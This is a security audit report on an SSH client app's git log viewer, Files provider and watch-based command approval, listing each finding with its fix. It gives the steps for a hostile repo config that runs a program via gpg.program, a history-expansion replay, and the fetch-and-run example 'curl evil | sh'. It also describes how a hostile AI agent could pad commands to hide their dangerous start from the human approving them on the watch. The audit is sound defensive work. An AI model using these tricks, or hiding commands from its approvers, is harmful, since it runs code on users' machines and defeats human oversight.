# Full audit of the changes since 27db873, 2026-10-17

## 1. Scope
Reviewed `git log 27db873..HEAD`: `gitlog.rs`, `pane_context.rs` (git log viewer, AI CLI detection, `!` prefix), `remote_fs.rs` and
`ExecStream` (Files provider core), `ios/SSHAppFiles`, the shared Keychain data (`SharedServers.swift`, entitlements),
`WatchProtocol`, `WatchBridge`, `ios/SSHAppWatch`.

Categories: MITM (host key pinning), replay, input validation, path traversal / symlinks, sandbox escape (repo-controlled commands),
DoS, metadata leakage. Ruled out: downgrade (no negotiation added), key confusion (no key derivation added), timing (no secret
comparison added), weak randomness (no new key/nonce material; the upload temp name uses `$$` but is created with `set -C`).

Live tests (loopback / local only, no tmux touched, own temp repos in the scratchpad): hostile repo config against `git show`/`git log`;
zsh history expansion with a `!`-prefixed line; plus the earlier loopback sshd end-to-end test of `RemoteFsClient` (hostile symlinks,
size cap, overwrite, cancel, wrong host key). Code analysis only: extension lifecycle, Keychain sharing, WatchConnectivity paths.

## 2. Findings
1. **[SandboxEscape] Medium - `git show` in the Git log sheet runs a program named in the repository's own config.**
   `gitlog.rs` (`GIT_SHOW_SCRIPT`). Attacker: anything that can write `.git/config` of the repo the tab is in (a compromised agent, a
   tool, a repo copied from elsewhere). Steps: `log.showSignature=true`, `gpg.program=<script>`, a commit with a `gpgsig` header; the
   phone user taps the commit. Verified live: the program ran (marker file created) for `git show --format=fuller`; `git log` with a
   custom `--pretty=format:` did not run it. It executes outside the agent's hook guard and sandbox, as the SSH user.
   Fix direction: force `-c log.showSignature=false -c gpg.program=false` on every git call the app makes.
2. **[InputValidation] Medium - `!` typed into a plain shell re-executes history.**
   `pane_context.rs` + `TerminalSessionViewModel.currentPaneContext` (5 s cache). If the AI CLI was just left (or a lookalike
   process is detected), `!git diff` goes to zsh/bash, where `!git` is history expansion. Verified live in `zsh -i`: `!echo diff` after
   `echo FIRST-COMMAND-RAN` ran `echo FIRST-COMMAND-RAN diff`, i.e. the previous matching command with the typed text appended
   (could be a `git push`). Fix direction: detect on every send (no cache), never prefix on `Unknown`; accept the tiny residual window.
3. **[MetadataLeak / spoofing] Medium - the watch shows only the last 160 characters of a command.**
   `WatchBridge.items`. A hostile agent can pad a command (`curl evil | sh  # ...150 characters...`) so the dangerous start is
   hidden on a 40 mm screen; flags were capped at 4. Fix direction: show head and tail with the length, and let the watch only
   deny commands that do not fit; the phone must refuse an `allow` for them too.
4. **[Integrity] Low - overwrite upload loses the file mode.** `upload_command`: the temp file is created with `umask 077` and moved
   over the target, so an executable script edited from Files loses its `x` bit (and ownership/hard links). Fix direction: copy the
   old mode onto the temp file before `mv`.
5. **[Availability] Low - the Files extension keeps its server data for its lifetime.** `FileProviderExtension.init` reads the shared
   list once: a re-pinned host key, another key or another root folder is ignored until the process restarts (connections to the
   re-pinned host are refused with the old pin). Fix direction: reload the server on every request and rebuild the pool on change.
6. **[Info] Git log/commit viewer shows committed secrets** (no credential blocklist, unlike the file browser). It is the user's own
   repository history; accepted.
7. **[DoS] Info - listing 20 000 entries forks two processes per entry** and can hit the 120 s exec limit; the result is a typed
   error, no hang (channel closed, remote loop ends on SIGPIPE/HUP). Accepted; a batched `stat` could be added later.
8. **[Replay] Info - watch replay**: a repeated verdict finds no pending entry (`not_pending`); a `seq` newer than published is
   rejected; ambiguous ids across hosts are rejected. Needs a device test.
9. **[MITM] Verified**: the Files client cannot be built without a pinned host key, a different key is refused (loopback test);
   the extension only sees servers with a pin.

## 3. Status of the fixes
1. Fixed: `-c log.showSignature=false -c gpg.program=false` on both git scripts (`git_safe!`); unit test reproduces the attack with a hostile repo and shows it is closed.
2. Fixed: no cache of the pane context, detection on every send.
3. Fixed: the watch gets start + end of long commands, the length and a `truncated` flag; Approve is disabled on the watch for them and the phone rejects an `allow` for them even if the watch sends one; flags up to 6.
4. Fixed: the old file mode is applied to the temp file before it replaces the target (script test).
5. Fixed: the extension reloads the server data on every request and rebuilds the connection pool when it changed.
6-8: accepted as described above.

## 4. Verdict
Findings, highest severity **Medium** (1-3, fixed in the same session; 4-5 Low, fixed; 6-8 accepted).
